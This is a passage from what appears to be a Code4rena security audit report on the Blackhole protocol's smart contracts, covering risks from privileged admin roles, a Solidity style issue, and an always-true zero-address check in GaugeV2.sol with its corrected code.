assign critical roles (e.g., connector tokens, whitelisted NFTs) to unauthorized or malicious addresses in exchange for bribes or personal gain. This could lead to privileged access, unfair trading advantages, or manipulation of protocol logic. Similarly, by removing or blacklisting legitimate entries, governance could censor users or competitors, undermining the fairness and neutrality of the protocol.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewhitelistNFT\u003c/code\u003e/\u003ccode\u003eblacklistNFT\u003c/code\u003e: The governance can misuse this by selectively whitelisting NFTs they own, allowing them to access exclusive features such as staking rewards, airdrops, or protocol privileges. Conversely, they could blacklist legitimate user NFTs to exclude them from benefits, creating unfair advantages or censorship.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewhitelistConnector\u003c/code\u003e/\u003ccode\u003ewhitelistConnectors\u003c/code\u003e: These functions allow governance to mark certain tokens as routing connectors, which can significantly influence DEX trading paths. A malicious actor could whitelist low-liquidity, high-fee, or malicious tokens to manipulate swaps, favor certain assets, or enable exploitative routing for personal gain.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eblacklistConnector\u003c/code\u003e: By blacklisting a connector, governance can disrupt the routing mechanism and effectively remove a token from trading paths. This could be used to block competitor tokens, harm projects that don’t align with governance interests, or censor tokens used widely by users, reducing decentralization and fairness.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetBucketType\u003c/code\u003e: This function allows governance to define or redefine the volatility bucket of tokens, potentially affecting their fee rates, risk handling, or trading logic. A dishonest actor could classify risky tokens as low-risk to game the system, offer misleading yields, or misrepresent token safety to users.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGenesisManager:\u003c/strong\u003e Has similar but limited access as compared to governance. Thus, the risks remain same for both.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e20. In the VoterV3.sol\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eOwner:\u003c/strong\u003e Does not have much access in this contract, but has the ability to set an epoch owner.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDoes not contain much risk (except that he can set it to a malicious address).\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eVoterAdmin:\u003c/strong\u003e The voter admin has the ability to \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e, \u003ccode\u003esetMaxVotingNum\u003c/code\u003e, \u003ccode\u003esetAVM\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIn the \u003ccode\u003esetPermissionsRegistry\u003c/code\u003e function, the VoterAdmin can set a new \u003ccode\u003epermissionRegistry\u003c/code\u003e contract. If misused, they could point it to a malicious or manipulated contract that disables or weakens access control checks. This could allow unauthorized gauge creation, voting participation, or protocol interactions that would normally be restricted, effectively undermining governance integrity and enabling privilege escalation.\u003c/li\u003e\n\u003cli\u003eThrough the \u003ccode\u003esetMaxVotingNum\u003c/code\u003e function, the VoterAdmin can adjust the maximum number of pools or items a user can vote on. While this is intended for flexibility, an abusive admin could set this value excessively high or low. A very high value could spam or overload the system, potentially exhausting gas or storage, while a low value could limit voter effectiveness, censor specific users or preferences, and bias the outcome of votes.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003esetAVM\u003c/code\u003e function allows the admin to assign the Auto Voting Manager (avm) by fetching it from the Voting Escrow contract. If \u003ccode\u003e_ve\u003c/code\u003e is compromised or misconfigured, this function could silently redirect AVM privileges to an untrusted actor. This risks vote automation being controlled by a malicious contract, allowing votes to be cast or overridden without user consent, compromising the fairness of governance.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGovernance:\u003c/strong\u003e Modifier is defined in this contract, but has no access to any of the functions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGenesisManager:\u003c/strong\u003e Modifier is defined in this contract, but has no access to any of the functions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e21. In the VotingEscrow.sol contract\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTeam:\u003c/strong\u003e Has the ability to \u003ccode\u003esetArtProxy\u003c/code\u003e, \u003ccode\u003esetAVM\u003c/code\u003e, \u003ccode\u003etoggleSplit\u003c/code\u003e, \u003ccode\u003esetSmNFTBonus\u003c/code\u003e. Here’s how he can misuse his powers:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003esetArtProxy\u003c/code\u003e (address proxy): The team can change the art rendering proxy to a malicious or broken contract. This can result in NFTs displaying incorrect metadata or art, potentially misleading users or damaging the visual and branding integrity of the collection. If metadata is dynamic and depends on this proxy, they could also encode hidden traits, tracking, or backdoors.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetAVM\u003c/code\u003e (address avm): By changing the Auto Voting Manager (AVM) to a manipulated contract, the team can automate votes in favor of their interests. This undermines fair governance by enabling vote hijacking, centralized decision-making, or even bribe-taking via scripted AVM behavior that does not reflect real user preferences.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etoggleSplit\u003c/code\u003e (bool state): This function may control whether NFTs can be split (e.g., fractionalized or split into sub-assets). Maliciously toggling this could disrupt NFT functionality, cause loss of composability or break integrations with platforms. Re-enabling or disabling split arbitrarily can be used to lock users out of expected functionality or manipulate secondary market behavior.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esetSmNFTBonus\u003c/code\u003e (uint bonus): This sets the bonus for special SM NFTs. If the team assigns excessively high bonuses, they can create unfair yield or voting power advantages for themselves or insiders holding those NFTs. This distorts protocol incentives and governance, allowing the team to indirectly accumulate more control or rewards.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol\" style=\"position:relative;\"\u003e\u003ca href=\"#12-function-declaration-does-not-follow-solidity-style-guide-at-fixedauctionsol\" aria-label=\"12 function declaration does not follow solidity style guide at fixedauctionsol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[12] Function declaration does not follow Solidity style guide at \u003ccode\u003eFixedAuction.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L14\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/FixedAuction.sol#L14\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-22\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-22\" aria-label=\"finding description 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003einitialize()\u003c/code\u003e function in the contract is written as follows:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e__Ownable_init\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis implementation does not conform to Solidity style guide and general best practices, particularly regarding code formatting, visibility placement, and readability.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eVisibility placement order:\u003c/strong\u003e According to the Solidity style guide (and common conventions), the order of function modifiers should follow this structure:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt;\u003c/span\u003e\u003cspan class=\"mtk10\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e\u0026gt;(...) [\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] [\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e|\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] [\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emodifiers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the current code, initializer is placed before public, which is unconventional and affects readability:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {  \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Incorrect order\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-22\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-22\" aria-label=\"impact 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eDoes not follow the official solidity’s style guide.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-34\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-34\" aria-label=\"recommended mitigation steps 34 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRecommended order:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitializer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"13-incorrect-require-statement-for-address-check-at-gaugev2sol\" style=\"position:relative;\"\u003e\u003ca href=\"#13-incorrect-require-statement-for-address-check-at-gaugev2sol\" aria-label=\"13 incorrect require statement for address check at gaugev2sol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[13] Incorrect require statement for address check at \u003ccode\u003eGaugeV2.sol\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeV2.sol#L139\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/GaugeV2.sol#L139\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-23\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-23\" aria-label=\"finding description 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe function \u003ccode\u003esetInternalBribe\u003c/code\u003e allows the contract owner to update the address of the internal bribe contract, which is used to receive fees:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetInternalBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//@audit incorrect require statement\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe purpose of the \u003ccode\u003erequire\u003c/code\u003e statement is to prevent setting an invalid address, particularly the zero address, which would disable fee forwarding. However, the current implementation does allow this.\u003c/p\u003e\n\u003ch3 id=\"impact-23\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-23\" aria-label=\"impact 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIneffective validation: The condition \u003ccode\u003erequire(_int \u003e= address(0), \"ZA\");\u003c/code\u003e is always true in Solidity because addresses are unsigned integers and cannot be less than zero.\u003c/li\u003e\n\u003cli\u003eZero address allowed: This means the zero address (\u003ccode\u003eaddress(0)\u003c/code\u003e) can be assigned unintentionally, potentially redirecting fees to the zero address and causing permanent loss of funds.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-35\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-35\" aria-label=\"recommended mitigation steps 35 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eCorrected Code:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetInternalBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Corrected Version\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch1 id=\"mitigation-review\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/h1\u003e\n\u003ch2 id=\"introduction\" style=\"position:relative;\"\u003e\u003ca href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@rayss\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@lonelybones\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/@maxzuvex\"\u003emaxzuvex\u003c/a\u003e) reviewed the mitigations for all identified issues. Additional details can be found within the \u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation\"\u003eC4 Blackhole Mitigation Review repository\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"mitigation-review-scope--summary\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review-scope--summary\" aria-label=\"mitigation review scope  summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" 